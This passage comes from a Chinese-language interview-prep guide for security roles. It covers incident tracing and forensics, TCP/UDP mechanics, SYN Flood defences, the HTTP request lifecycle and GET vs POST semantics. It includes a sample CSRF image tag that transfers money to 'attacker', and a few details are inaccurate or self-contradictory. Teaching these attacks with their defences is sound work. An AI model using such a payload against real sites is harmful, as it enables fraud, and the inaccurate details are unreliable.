2. 钓鱼邮件携带附件 → 样本分析（VT 沙箱 + IDA）
3. 样本含 C2 域名 → whois 查询注册人
4. C2 域名解析 IP → 地理位置（俄罗斯/东南亚）
5. 历史 C2 IP 关联其他事件 → APT 组织 TTP 比对
6. 结论：疑似 APT-XX 组织

**案例 2：内网横向溯源**
1. 告警：某 IP 触发 Mimikatz 特征
2. 该 IP 主机 ED 历史：上午 9 点登录失败 → 成功登录 → 进程派生 powershell → 注入 lsass
3. 关联其他主机告警：同源 IP 1 小时内访问 5 台主机 SMB
4. 攻击链：钓鱼 → 边界机 → 提权 → mimikatz → PtH → 横向
5. 溯源到攻击者初始入口 = 钓鱼邮件附件

**案例 3：拖库溯源**
1. WAF 告警：SQL 注入成功
2. 数据库审计：异常大查询 → 客户表全量
3. 流量分析：响应包大小异常大
4. 攻击者 IP + 时间 → 关联其他告警
5. 完整证据链交付公安机关

**4. 取证技术**：

**主机取证**：
- 内存镜像（FTK Imager / LiME）
- 磁盘镜像（dd / FTK Imager）
- 文件恢复（已删除文件）
- 时间线分析（Plaso/log2timeline）
- 进程/网络状态快照

**网络取证**：
- 全流量包（PCAP）
- NetFlow/sFlow
- DNS 日志
- HTTP 日志（含 WAF 拦截记录）

**样本分析**：
- 静态（字符串/导入表/PE 结构）
- 动态（沙箱：ANY.RUN/CAPE/Sandboxie）
- 反调试绕过（IDA + x64dbg）

**5. 工具链**：

| 类别 | 工具 |
|------|------|
| 取证 | Autopsy/FTK/Sleuth Kit/Volatility |
| 流量 | Wireshark/tcpdump/NetworkMiner |
| 样本 | IDA/Ghidra/x64dbg/VirusTotal |
| 威胁情报 | ThreatBook/MicroSoft TI/VirusTotal |
| 蜜罐 | HFish/T-Pot/Cowrie |
| 内存 | Velociraptor/MemProcFS |
| 时间线 | Plaso/log2timeline |

**6. 报告输出**：

**事件报告要素**：
1. **事件概述**：时间、影响、严重程度。
2. **攻击时间线**：完整攻击链时间。
3. **技术细节**：漏洞利用、工具、C2。
4. **影响评估**：数据泄露量、业务影响、横向范围。
5. **IOC 清单**：IP/域名/文件 hash/UA。
6. **TTPs 映射**：与 ATT&CK 比对。
7. **溯源结论**：攻击者画像（疑似/确认）。
8. **加固建议**：紧急/中期/长期。
9. **附件**：截图、PCAP、样本、内存 dump。

**解析**：

考察意图：考察溯源反制实战能力。回答要点：溯源流程 + 反制手段 + 案例 + 工具链 + 报告。易错点：只说"溯源"不讲法律边界。面试官想听到：能讲清"攻击链还原 + 攻击者画像 + 威胁情报关联"完整流程、知道蜜罐反制是高价值手段、了解 ATT&CK TTP 映射、明白反制必须合规（不能"以攻对攻"）。

**考察知识点**：
- 溯源 5 步（告警→攻击链→画像→情报→法律）
- 攻击者画像维度（IP/UA/工具/时间/语言/资源）
- 反制手段（蜜罐/JS 探针/法律联动）
- 取证技术（主机/网络/样本）
- 报告要素（时间线+IOC+TTP+画像+加固）
- ATT&CK TTP 映射

### 第 39 天（精讲） TCP 与 UDP 的完整对比
**主题**：网络协议 / 传输层

**答案**：

TCP 和 UDP 是 TCP/IP 协议族中传输层的两大协议，**特性互补**，决定了应用场景。

**1. 多维对比**：

| 维度 | TCP | UDP |
|------|-----|-----|
| 连接性 | 面向连接（三次握手） | 无连接（直接发） |
| 可靠性 | 确认/重传/排序/去重 | 尽力交付，不保证到达 |
| 有序性 | 字节流保证顺序 | 数据报独立，无序 |
| 流量控制 | 滑动窗口 | 无 |
| 拥塞控制 | 慢启动/拥塞避免/快重传/快恢复 | 无 |
| 头部开销 | 20-60 字节 | 8 字节 |
| 传输效率 | 低（开销大） | 高 |
| 传输模式 | 一对一 | 一对多（广播/多播） |
| MTU | 受 MSS 影响 | 受路径 MTU 影响 |
| 适用场景 | 文件/HTTP/SSH/数据库 | DNS/视频/语音/QUIC/直播 |

**2. TCP 关键机制**：

**三次握手**（详见 D41）：
- 客户端 SYN → 服务端 SYN+ACK → 客户端 ACK
- 同步双方 ISN（初始序列号）
- 双方确认收发能力

**四次挥手**（详见 D40）：
- 主动方 FIN → 被动方 ACK → 被动方 FIN → 主动方 ACK
- 全双工需双向关闭
- TIME_WAIT 等待 2MSL 防旧包

**滑动窗口**：
- 接收方通过 ACK 通告窗口大小（接收缓存剩余）
- 发送方控制发送速率（不能超过窗口）
- 实现流量控制（接收方缓存有限）

**拥塞控制**：
- **慢启动**：初始 cwnd=1 MSS，每收到一个 ACK 加倍，指数增长。
- **拥塞避免**：达到 ssthresh 后，每 ACK cwnd+1 MSS，线性增长。
- **快重传**：收到 3 个重复 ACK 立即重传（不等待超时）。
- **快恢复**：cwnd = ssthresh = cwnd/2，跳过慢启动。

**粘包/拆包**：
- TCP 是**字节流**，消息边界需应用层自定义（HTTP 的 `Content-Length`、WebSocket 的 payload length、Redis 的 RESP 协议）。

**3. UDP 关键特性**：

**无连接**：
- 发送方 `sendto()`，接收方 `recvfrom()`。
- 不维护连接状态（无 SYN/ACK/FIN）。
- 适合短消息、DNS 查询。

**广播/多播**：
- 广播（255.255.255.255）：子网内所有主机接收。
- 多播（224.0.0.0/4）：订阅特定组的主机接收。
- 用于视频会议、路由协议（OSPF）、DHCP。

**轻量**：
- 头部仅 8 字节（TCP 20+）。
- 无握手、无确认、无重传、无拥塞控制。
- 适合实时性、低延迟场景。

**限制**：
- 不保证到达（应用层需自行处理）。
- 不可靠、有序性。
- NAT 穿透需 STUN/TURN/ICE。

**4. 协议选型原则**：

| 需求 | 选 TCP | 选 UDP |
|------|--------|--------|
| 数据完整性优先 | ✓ | ✗ |
| 实时性优先 | ✗ | ✓ |
| 一对多 | ✗ | ✓（需广播/多播） |
| 公网传输 + NAT | ✓（HTTP/S 普遍支持） | △（UDP NAT 穿透需 STUN/TURN） |
| 大文件传输 | ✓ | ✗ |
| 嵌入式/IoT 资源受限 | ✗ | ✓ |

**5. 现代协议栈**：

**QUIC**（Quick UDP Internet Connections）：
- 基于 UDP，但实现 TCP 的可靠性 + TLS 1.3 加密。
- 0-RTT / 1-RTT 握手（比 TCP+TLS 快）。
- 多路复用（无队头阻塞）。
- HTTP/3 基于 QUIC。
- 浏览器和 CDN 已逐步支持。

**HTTP/3 演进**：
- HTTP/1.1：文本协议，单连接串行（Head-of-line blocking）。
- HTTP/2：二进制分帧，多路复用（但仍 TCP，单流阻塞）。
- HTTP/3：基于 QUIC（UDP），无队头阻塞。

**6. 安全相关攻击**：

**TCP SYN Flood（DoS）**：
- 攻击者发大量伪造 SYN 包 → 服务端回 SYN+ACK 给假客户端 → 永远收不到 ACK → 半连接队列溢出。
- 防御：SYN Cookie、半连接队列调大、防火墙 SYN 限速。

**TCP 会话劫持**：
- 攻击者预测 TCP 序列号 → 注入伪造数据包。
- 防御：随机化 ISN、HTTPS、IPSec。

**UDP 反射放大 DDoS**：
- 利用 DNS/NTP/SSDP/CHARGEN 等协议的请求-响应放大（响应远大于请求），做 DDoS 源。
- 防御：响应速率限制、源 IP 验证（BCP38/uRPF）、关闭开放 DNS/NTP 递归。

**UDP 伪造源 IP**：
- 无连接特性使源 IP 易伪造。
- 防御：uRPF（unicast Reverse Path Forwarding）。

**TCP 端口扫描**：
- SYN 扫描（半开）：快速隐蔽。
- 全连接扫描：被记录。
- FIN/NULL/Xmas 扫描：穿透简单防火墙。

**7. 实战案例**：

**SSH 选 TCP**：可靠性优先，丢包重传。
**DNS 选 UDP**：查询量极大，单包小，可容忍少量丢包。
**视频会议选 UDP**：实时性优先，丢帧无所谓。
**HTTP/3 选 UDP（QUIC）**：兼顾可靠性 + 速度 + 加密。
**数据库选 TCP**：数据完整性 + 长连接。

**8. 性能优化**：

**TCP 优化**：
- 调大滑动窗口（net.ipv4.tcp_window_scaling）
- 开启 TCP Fast Open（TFO，减少握手）
- 启用拥塞控制算法（BBR / CUBIC）
- 关闭 Nagle 算法（TCP_NODELAY，低延迟）

**UDP 优化**：
- 应用层实现重传（QUIC / KCP）
- FEC（前向纠错）抗丢包
- Jitter Buffer 抗抖动

**解析**：

考察意图：考察网络基础功底的深度。回答要点：多维对比 + TCP 机制 + UDP 特性 + 选型原则 + 安全攻击。易错点：只说"TCP 可靠 UDP 不可靠"这种浅层对比。面试官想听到：能讲清滑动窗口/拥塞控制、UDP 广播多播的用途、SYN Flood 反射放大 DDoS 的攻击与防御、QUIC 是未来趋势。

**考察知识点**：
- TCP 三大机制（连接管理+滑动窗口+拥塞控制）
- UDP 适合场景与限制（实时/广播/低延迟）
- 协议选型原则（可靠性 vs 实时性 vs 一对多）
- 安全攻击：SYN Flood / 反射放大 DDoS / 会话劫持
- QUIC 与 HTTP/3 演进
- 性能优化（TFO/BBR/TCP_NODELAY）

### 第 40 天（精讲） ★★★★★ TCP 三次握手四次挥手过程


**主题**：网络安全基础 / TCP/IP 协议

**答案**：

TCP 三次握手建立连接：
1. 第一次握手：客户端发送 SYN 包（seq=x）到服务器，进入 SYN_SEND 状态，等待服务器确认。
2. 第二次握手：服务器收到 SYN 包，确认客户端 SYN（ack=x+1），同时自己发送 SYN 包（seq=y），即 SYN+ACK 包，服务器进入 SYN_RECV 状态。
3. 第三次握手：客户端收到服务器的 SYN+ACK 包，向服务器发送确认包 ACK（ack=y+1），双方进入 ESTABLISHED 状态，完成三次握手。

TCP 四次挥手关闭连接（因 TCP 全双工需双方分别关闭）：
1. 第一次挥手：主动关闭方发送 FIN 包，进入 FIN_WAIT_1 状态。
2. 第二次挥手：被动方收到 FIN，发送 ACK 确认，进入 CLOSE_WAIT 状态，主动方收到后进入 FIN_WAIT_2。
3. 第三次挥手：被动方发送 FIN，进入 LAST_ACK 状态。
4. 第四次挥手：主动方收到 FIN，发送 ACK 确认，进入 TIME_WAIT 状态（等待 2MSL 确保对端收到 ACK），被动方收到后 CLOSED。

关键状态：SYN_SEND / SYN_RECV / ESTABLISHED / FIN_WAIT_1 / FIN_WAIT_2 / TIME_WAIT / CLOSE_WAIT / LAST_ACK。

**解析**：

考察意图：网络基础功底，决定面试官第一印象。回答要点：讲清每步标志位变化和状态机迁移。易错点：把三次握手和 HTTP 请求混为一谈，或忽视 TIME_WAIT 的 2MSL 设计目的（保证最后 ACK 到达 + 旧报文消失）。面试官想听到：能区分 SYN/ACK 标志位、理解半连接队列、SYN Flood 正是利用半连接队列溢出。

**考察知识点**：

- TCP 三次握手状态机（SYN_SEND→SYN_RECV→ESTABLISHED）
- 四次挥手状态迁移（FIN_WAIT / CLOSE_WAIT / TIME_WAIT）
- TIME_WAIT 2MSL 设计目的
- SYN Flood 利用半连接队列缺陷

---


---

### 第 41 天（精讲） TCP 为何三次握手（而非两次）
**主题**：网络协议 / TCP / 连接管理

**答案**：

核心原因：**三次握手实现"双向可达确认 + 初始序列号（ISN）同步"**。

**1. 两次握手为什么不够**：

**两次握手流程**：
1. 客户端 SYN（seq=x）→ 服务端
2. 服务端 SYN+ACK（seq=y, ack=x+1）← 客户端
3. **连接建立**（服务端认为建立）

**问题 1：服务端不知道自己的 SYN 是否到达客户端**
- 若 SYN+ACK 在网络丢失，客户端等不到，连接失败。
- 但服务端已分配资源（半连接队列）等待客户端 ACK（永远等不到）。
- 服务端浪费资源。

**问题 2：历史失效连接**
- 网络中可能有"迷路"的旧 SYN 包（如路由环路、客户端崩溃后的重传）。
- 若两次握手，服务端立即分配资源并等待 ACK（永远等不到）→ 半连接队列堆积 → 资源耗尽。

**2. 三次握手如何解决**：

**三次握手流程**：
1. 客户端 SYN（seq=x）→ 服务端
2. 服务端 SYN+ACK（seq=y, ack=x+1）← 客户端
3. 客户端 ACK（seq=x+1, ack=y+1）→ 服务端
4. **连接建立**

**双向可达确认**：
- 客户端收到 SYN+ACK → 证明"客户端→服务端可达 + 服务端→客户端可达"。
- 服务端收到 ACK → 证明"客户端→服务端可达"（已被客户端的 SYN 隐含证明）。
- 服务端**直到收到 ACK 才分配完整资源**（避免浪费）。

**ISN 同步**：
- 双方各自生成 ISN，后续数据包 ACK 号基于此。
- 客户端收到 SYN+ACK 后能验证 ISN 是否匹配（防伪造）。

**历史失效连接处理**：
- 客户端若收到旧 SYN（ISN 不匹配），发 RST 终止。
- 服务端释放资源。

**3. 完整 TCP 状态机**：

```
客户端状态：
CLOSED → SYN_SENT → ESTABLISHED → FIN_WAIT_1 → FIN_WAIT_2 → TIME_WAIT → CLOSED
                                 ↓
                              CLOSE_WAIT ← ESTABLISHED ← 服务端

服务端状态：
CLOSED → LISTEN → SYN_RCVD → ESTABLISHED → CLOSE_WAIT → LAST_ACK → CLOSED
```

**4. SYN Flood 攻击**：

**原理**：
- 攻击者发大量伪造源 IP 的 SYN 包。
- 服务端为每个 SYN 在半连接队列（Syn Queue）分配资源，回 SYN+ACK 给"假客户端"。
- 永远收不到 ACK → 半连接队列满 → 正常用户的 SYN 被丢弃 → DoS。

**SYN Flood 变种**：
- **直接攻击**：源 IP 完全随机。
- **ACK Flood**：先建立连接再发大量 ACK（消耗服务端处理能力）。
- **Connection Flood**：建立大量完整连接后保持（消耗文件描述符）。

**5. 防御 SYN Flood**：

**SYN Cookie**（最有效）：
- 服务端**不立即分配资源**，把 SYN+ACK 的序列号编码为客户端 IP/端口/时间的哈希（cookie）。
  ```
  cookie = hash(src_ip, src_port, dst_ip, dst_port, src_seq, time)
  seq = cookie
  ```
- 客户端回 ACK 时携带 cookie（通过 ACK 号回传）。
- 服务端验证 cookie 通过 → 分配资源。
- 攻击者无法伪造合法 cookie（不知 hash 算法和时间）→ DoS 失效。

**半连接队列调大**（治标不治本）：
- `net.ipv4.tcp_max_syn_backlog = 65536`。
- 缓解但不能根治。

**SYN Proxy**（防火墙/中间设备）：
- 防火墙代替服务端接收 SYN，半连接队列在防火墙上。
- 服务端只接收已建立的连接。

**缩短 SYN Timeout**：
- `net.ipv4.tcp_synack_retries = 2`（默认 5）。
- 加速半连接释放。

**6. TIME_WAIT 设计目的（2MSL）**：

**MSL** = Maximum Segment Lifetime，报文最长存活时间（通常 60s），**2MSL = 120s**。

**目的**：
1. **保证最后 ACK 到达**：主动方发最后 ACK 后进入 TIME_WAIT，若 ACK 丢失，被动方会重传 FIN，主动方在 TIME_WAIT 内能响应（否则连接已关闭，无法响应）。
2. **让网络中的旧报文消失**：避免与新连接（同 IP/端口对）冲突。

**TIME_WAIT 过多问题**：
- 主动关闭方（如 HTTP 客户端）大量 TIME_WAIT 会占端口（2MSL 内）。
- 高并发 HTTP 服务端常见问题。
- 优化：`net.ipv4.tcp_tw_reuse = 1`（仅客户端）、`tcp_tw_recycle`（已废弃，慎用）。

**7. 实战问答**：

**Q：SYN 重试次数怎么算？**
- 客户端 SYN 重试：`tcp_syn_retries = 6`（默认）。
- 服务端 SYN+ACK 重试：`tcp_synack_retries = 5`（默认）。
- 总时长：客户端 6 次重试 ≈ 63 秒。

**Q：三次握手可以改成两次吗？**
- 理论可以（增加 SYN Cookie 等机制），但破坏标准兼容性，且无法防御 SYN Flood。

**Q：TCP 同时打开（simultaneous open）会怎样？**
- 两端同时发 SYN → 两端都回 SYN+ACK → 两端都发 ACK → 连接建立（4 次报文）。
- 极少发生，但协议支持。

**8. 与 TLS 握手的配合**：

**HTTP 1.1**：
- TCP 三次握手 → HTTP 请求/响应。
- 每个请求都要建立新 TCP（默认 Keep-Alive）。

**HTTPS**：
- TCP 三次握手 → TLS 握手（1-2 RTT）→ HTTP 请求/响应。
- TLS 1.2 = 2 RTT；TLS 1.3 = 1 RTT。

**HTTP/2 / QUIC**：
- HTTP/2 基于 TCP，仍需 TCP 握手。
- QUIC（基于 UDP）合并握手：1 RTT 完成连接 + 加密（0-RTT 模式更快）。

**解析**：

考察意图：考察 TCP 设计的深层理解。回答要点：双向确认 + 历史连接问题 + SYN Flood 防御 + TIME_WAIT。易错点：只说"防止历史连接"（太浅）。面试官想听到：能讲清 SYN Cookie 是怎么工作的、知道 TIME_WAIT 等 2MSL 的原因、明白 SYN Flood 利用半连接队列溢出。

**考察知识点**：
- 双向可达确认 + ISN 同步
- 历史失效连接的资源浪费
- SYN Flood 攻击原理与变种
- SYN Cookie 防御机制
- 半连接队列 + SYN Proxy
- TIME_WAIT 2MSL 设计目的
- TLS 1.2/1.3 与 QUIC 演进

### 第 42 天（精讲） 一次完整 HTTP 请求过程
**主题**：Web / HTTP / 网络全链路

**答案**：

从输入 `https://www.example.com/index.html` 到页面渲染，经历 **6 个阶段**。

**1. URL 解析与编码**：
- 浏览器解析 URL：`scheme=https`、`host=www.example.com`、`path=/index.html`。
- 浏览器自身 URL 编码（特殊字符如中文、空格 → `%E4%B8%AD`）。

**2. DNS 解析**（详见 D46）：
```
浏览器缓存（Chrome 默认 60s）
  ↓ 命中 → 返回 IP
系统缓存（Windows ipconfig /displaydns，Linux systemd-resolved）
  ↓ 命中 → 返回 IP
hosts 文件（C:\Windows\System32\drivers\etc\hosts）
  ↓ 命中 → 返回 IP
本地 DNS 递归查询（运营商 DNS，如 8.8.8.8 / 114.114.114.114 / 223.5.5.5）
  ↓
根 DNS（13 组 a-m.root-servers.net）→ 顶级域 .com → 权威 DNS → 返回 IP
  ↓
本地 DNS 缓存 + 返回客户端
```

**3. TCP 三次握手**（建立连接）：
```
客户端 → SYN (seq=x) → 服务端
服务端 → SYN+ACK (seq=y, ack=x+1) ← 客户端
客户端 → ACK (seq=x+1, ack=y+1) → 服务端
```

**4. TLS 握手**（HTTPS 才有）：
```
TLS 1.2（2 RTT）：
  ClientHello（支持的 TLS 版本、加密套件、随机数）
    → 服务端
  ServerHello + Certificate + ServerHelloDone
    ← 服务端发送证书（含公钥）
  ClientKeyExchange（Pre-master 加密）+ ChangeCipherSpec + Finished
    → 客户端发送用证书公钥加密的 Pre-master
  ChangeCipherSpec + Finished
    ← 服务端确认

TLS 1.3（1 RTT）：
  ClientHello（支持的版本、密钥共享、加密套件）
    → 服务端
  ServerHello + Certificate + Finished（带密钥共享）
    ← 服务端
  Finished（客户端）
    → 客户端
```

**5. HTTP 请求与响应**：

**请求**：
```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=abc123; theme=dark
Referer: https://www.example.com/
Connection: keep-alive
```

**响应**：
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 12345
Set-Cookie: session=new_value; HttpOnly; Secure; SameSite=Lax
Cache-Control: max-age=3600
ETag: "abc123"
Server: nginx/1.24.0
Date: Mon, 22 Sep 2026 10:00:00 GMT

<!DOCTYPE html>
<html>...
```

**6. 浏览器解析与渲染**：

```
解析 HTML
  ↓ 构建 DOM 树
解析 CSS
  ↓ 构建 CSSOM 树
DOM + CSSOM
  ↓
Render Tree（可见元素）
  ↓
Layout（计算位置 + 尺寸）
  ↓
Paint（绘制像素）
  ↓
Composite（合成层）
  ↓
显示在屏幕
```

**遇到 `<script>`**：
- 默认阻塞解析（HTML parser blocking）。
- `defer`：延迟到 HTML 解析完执行。
- `async`：下载完立即执行（异步）。
- `type=module`：默认 defer。

**遇到 `<img>/<link>/<script src>`**：
- 发起新的 HTTP 请求。
- HTTP/1.1 限制同域 6 个并发。
- HTTP/2 多路复用无并发限制。

**7. TCP 四次挥手 / 长连接复用**：

**短连接**（HTTP/1.0 默认）：
- 每个资源都要建立新 TCP。
- 资源加载慢（3 次握手 + TLS 握手）。

**Keep-Alive**（HTTP/1.1 默认）：
- 连接复用，超时（通常 60s）或显式 `Connection: close` 才断开。
- 一个 TCP 连接可加载多个资源。

**多路复用**（HTTP/2）：
- 单连接并发多个请求流（stream）。
- 无队头阻塞（不同 stream 互不影响）。
- 头部压缩（HPACK）。

**0-RTT / 1-RTT**（HTTP/3 / QUIC）：
- QUIC 基于 UDP，无 TCP 握手。
- 0-RTT：客户端在 ClientHello 中带 PSK（Pre-Shared Key）直接发请求。
- 1-RTT：首次连接需 1-RTT，二次连接 0-RTT。

**8. 性能优化点**：

**DNS 优化**：
- DNS 预解析：`<link rel="dns-prefetch" href="//cdn.example.com">`
- DNS 缓存调优：浏览器、操作系统、本地 DNS TTL。

**网络优化**：
- HTTP/2 升级（多路复用 + 头部压缩）。
- HTTP/3 升级（QUIC，低延迟 + 0-RTT）。
- 长连接复用（Keep-Alive）。
- TLS False Start（TLS 1.3 已内置）。
- CDN 加速（缩短 DNS + TCP + TLS 时延）。

**资源优化**：
- 压缩（gzip / brotli / zstd）。
- 雪碧图（CSS Sprites）。
- 字体子集化。
- 图片懒加载（`loading="lazy"`）。
- 代码分割（Code Splitting）。

**9. 安全相关**：

**同源策略**（Same-Origin Policy）：
- 协议 + 域名 + 端口相同 → 同源。
- 跨源脚本默认无法访问 DOM、Cookie、Storage。

**CORS**（跨域资源共享）：
- 服务端返回 `Access-Control-Allow-Origin: https://example.com` 允许跨域。
- 非简单请求需先发 OPTIONS 预检请求。

**CSP**（内容安全策略）：
- `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com`。
- 限制脚本/图片/样式加载源（防 XSS）。

**HSTS**（HTTP 严格传输安全）：
- `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`。
- 强制 HTTPS（防 SSL Stripping）。

**X-Frame-Options**：
- `DENY` / `SAMEORIGIN` / `ALLOW-FROM uri`。
- 防点击劫持（Clickjacking）。

**X-Content-Type-Options**：
- `nosniff`。
- 防 MIME 嗅探。

**Referrer-Policy**：
- 控制 Referer 头传递（防敏感 URL 泄露）。
- `strict-origin-when-cross-origin`（默认现代浏览器）。

**10. 实战调试工具**：

- **Chrome DevTools**：Network/Performance/Security 面板。
- **Wireshark**：底层包分析。
- **curl -v**：命令行 verbose 输出。
- **httpie**：友好的 HTTP 客户端。
- **tcpdump**：抓包分析 DNS/TCP/TLS。

**解析**：

考察意图：考察 Web 全链路理解。回答要点：分阶段讲清 DNS→TCP→TLS→HTTP→渲染→连接复用。易错点：只讲 HTTP 请求本身（漏掉 DNS/TCP/TLS）。面试官想听到：能讲清 HTTP/1.0/1.1/2/3 演进、HTTP/2 多路复用原理、浏览器渲染阻塞与优化、知道安全相关头（CSP/HSTS/X-Frame-Options）。

**考察知识点**：
- DNS → TCP → TLS → HTTP → 渲染全链路
- HTTP/1.0/1.1/2/3 演进（短连接 → Keep-Alive → 多路复用 → QUIC）
- 浏览器渲染流程（DOM/CSSOM/Render Tree/Layout/Paint/Composite）
- Web 性能优化（DNS 预解析/HTTP/2/CDN/压缩/连接复用）
- Web 安全头（CSP/HSTS/X-Frame-Options/X-Content-Type-Options/Referrer-Policy）

### 第 43 天（精讲） GET 与 POST 区别
**主题**：Web / HTTP 方法 / REST 语义

**答案**：

GET 与 POST 是 HTTP/1.1 定义的两种方法，区别体现在**参数位置、安全性、语义、缓存**四个维度。

**1. 多维对比**：

| 维度 | GET | POST |
|------|-----|------|
| 参数位置 | URL Query String | 请求体 |
| 数据可见性 | URL 可见（浏览器历史、服务器日志、Referer 头） | 相对不可见 |
| 长度限制 | 浏览器/服务器约定（通常 ~2-8 KB） | 几乎无限制 |
| 缓存 | 可被浏览器/代理缓存 | 默认不缓存 |
| 书签 | URL 可收藏 | 不可 |
| 幂等性 | **幂等**（多次调用结果相同） | **非幂等**（每次都创建新资源） |
| 安全性 | 语义"安全"（不修改资源） | 语义"非安全"（修改资源） |
| 后端历史 | 留在 Web 服务器访问日志 | 不留 URL 历史 |
| Content-Type | 不需要 | `application/x-www-form-urlencoded`、`multipart/form-data`、`application/json` |
| 适用场景 | 查询/读取 | 创建/修改/提交 |

**2. REST 语义层面**：

**幂等性（Idempotent）**：
- GET：**幂等** — 多次调用结果应相同（`GET /user/123` 永远返回 user 123）。
- POST：**非幂等** — 每次都创建新资源（`POST /orders` 每次创建新订单）。

**安全性（Safe）**：
- GET：**安全** — 不修改服务器状态（除了日志）。
- POST：**非安全** — 修改服务器状态（创建资源、扣款等）。

**REST 设计原则**：
- GET = 查询（如 `GET /users/123`）
- POST = 创建（如 `POST /users`）
- PUT = 完整替换（幂等，如 `PUT /users/123` + 完整 user 对象）
- PATCH = 部分更新（如 `PATCH /users/123` + `{"name": "new"}`）
- DELETE = 删除（幂等，如 `DELETE /users/123`）

**3. 为什么 POST 不一定"更安全"**：

**误区**：POST 因参数不在 URL 所以更安全。

**真相**：
- POST 数据虽不在 URL 可见，但**仍是明文**，被抓包（Burp/Wireshark）即可读取。
- 真正的安全靠 **HTTPS**（加密传输）。
- 敏感数据（密码、身份证、银行卡）应用 **POST + HTTPS**，绝不放在 URL。

**实际应用误区**：
1. **登录用 GET + URL 带密码**：危险，URL 会被记录到浏览器历史、服务器日志、代理日志、Referer 头泄露。
2. **删除操作误用 GET**：违反 REST 语义，且 GET 可被 `<img src="...?delete=1">` 触发 CSRF。
3. **POST 不可缓存的滥用**：本可缓存的查询用 POST，导致无法利用 CDN 缓存。
4. **GET 长度限制忽略**：长参数拼接在 URL，超过 8KB 被截断或返回 414。

**4. 其他 HTTP 方法**：

| 方法 | 语义 | 幂等 | 安全 |
|------|------|------|------|
| GET | 获取资源 | 是 | 是 |
| POST | 创建资源/提交 | 否 | 否 |
| PUT | 完整替换 | 是 | 否 |
| PATCH | 部分更新 | 否 | 否 |
| DELETE | 删除资源 | 是 | 否 |
| HEAD | GET 但只返回头 | 是 | 是 |
| OPTIONS | CORS 预检/查询支持方法 | 是 | 是 |
| TRACE | 回显请求（调试用） | 是 | 是 |
| CONNECT | 建立隧道（HTTP 代理） | 否 | 否 |

**HEAD**：
- 用于检查资源是否存在、Last-Modified、Content-Length。
- 不会返回响应体（节省带宽）。

**OPTIONS**：
- CORS 预检请求。
- 服务器返回 `Allow: GET, POST, OPTIONS` 告知支持的方法。

**TRACE**：
- 回显收到的请求，用于调试。
- **几乎禁用**（会引发 XST 跨站追踪攻击，可读取 Cookie + Authorization 头）。

**5. 预检请求与 CORS**：

**简单请求**（无需预检）：
- 方法：GET / HEAD / POST
- Content-Type：`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`
- 无自定义头

**非简单请求**（需预检）：
- 方法：PUT / DELETE / PATCH / 其他
- Content-Type：`application/json` 等
- 自定义头（如 `X-Custom-Header`、`Authorization`）

**预检流程**：
```
客户端 → OPTIONS /api/users HTTP/1.1
         Origin: https://example.com
         Access-Control-Request-Method: POST
         Access-Control-Request-Headers: Content-Type, X-Custom-Header

服务端 ← HTTP/1.1 204 No Content
            Access-Control-Allow-Origin: https://example.com
            Access-Control-Allow-Methods: GET, POST, PUT, DELETE
            Access-Control-Allow-Headers: Content-Type, X-Custom-Header
            Access-Control-Max-Age: 86400

客户端 → POST /api/users HTTP/1.1（实际请求）
            ...
```

**6. CSRF 与 HTTP 方法**：

**GET 易触发 CSRF**：
```html
<img src="http://bank.com/transfer?to=attacker&amount=100">
<!-- 浏览器自动 GET -->
```

**POST 难触发 CSRF**：
- 需要表单 + JS 自动提交（部分浏览器 SameSite Cookie 可挡）。
- 但仍需 CSRF Token + Referer 校验。

**最佳实践**：
- 重要操作（转账、改密）用 POST + CSRF Token + 二次验证。
- GET 仅用于查询/读取。
- 不在 GET 中放敏感数据。

**7. 浏览器与服务器的长度限制**：

**浏览器端**：
- Chrome：URL 总长 2 MB（实际 ~8-32 KB 之后会被截断）。
- Firefox：65 KB（实际 ~8 KB）。
- Safari：80 KB。
- IE：2 KB。

**服务器端**：
- Apache：`LimitRequestLine 4096`（默认）。
- Nginx：`large_client_header_buffers 4 8k`。
- Tomcat：`maxHttpHeaderSize 8192`。

**实际限制**：
- 浏览器/服务器**约定**而非协议硬限。
- 不同浏览器/服务器实现不同。
- 安全做法：GET 参数 ≤ 2 KB。

**8. RESTful API 设计最佳实践**：

```http
GET    /users              # 用户列表
GET    /users/123          # 用户详情
POST   /users              # 创建用户
PUT    /users/123          # 完整更新用户
PATCH  /users/123          # 部分更新用户
DELETE /users/123          # 删除用户
GET    /users/123/orders   # 用户的订单
POST   /users/123/orders   # 为用户创建订单
```

**错误做法**：
```http
GET    /getUser?id=123           # 动词不应在 URL
POST   /deleteUser               # 动词应在 URL
POST   /user/123/updatePassword  # 动词在 URL
GET    /api/create_user          # 不一致
```

**9. 实战问答**：

**Q：登录用什么方法？**
- 推荐 POST（参数不在 URL，更符合 REST）。
- 必须 HTTPS（加密密码）。
- 加 CSRF Token。

**Q：搜索用什么方法？**
- GET（可缓存、可分享 URL、可爬虫收录）。
- 参数放 URL Query String。

**Q：上传文件用什么方法？**
- POST + `multipart/form-data`。
- 不能 GET（无法放二进制 body）。

**Q：API 调用用什么方法？**
- 看语义：查询用 GET，创建/修改用 POST/PUT/PATCH/DELETE。

**解析**：

考察意图：考察 Web 基础与 REST 语义理解。回答要点：从"参数位置"上升到"语义层面"（幂等/安全）。易错点：只讲参数位置（表层）或误说"POST 更安全"。面试官想听到：能讲清幂等性的重要性（GET 缓存友好）、明白 POST 也需 HTTPS、知道其他 HTTP 方法（PUT/PATCH/DELETE/HEAD/OPTIONS）、了解 CORS 预检流程。

**考察知识点**：
- GET vs POST 多维对比（位置/可见/缓存/幂等/语义）
- REST 语义：安全 + 幂等
- POST 不等于安全（仍需 HTTPS）
- 其他 HTTP 方法（PUT/PATCH/DELETE/HEAD/OPTIONS）
- CORS 预检请求与简单请求
- CSRF 与方法的关系

### 第 44 天（精讲） ★★★★★ Cookie 与 Session 的区别和联系


**主题**：网络安全基础 / 会话机制

**答案**：

Cookie 和 Session 都是 Web 会话跟踪机制，但实现方式不同：

**Cookie**：
- 存储位置：浏览器客户端（文本文件），受大小限制（通常 4KB）
- 安全性：易被 XSS 窃取，可设置 http-only 禁止 JS 读取
- 生命周期：可设置过期时间，持久化或会话级
- 应用：身份认证、购物车、个性化推荐

**Session**：
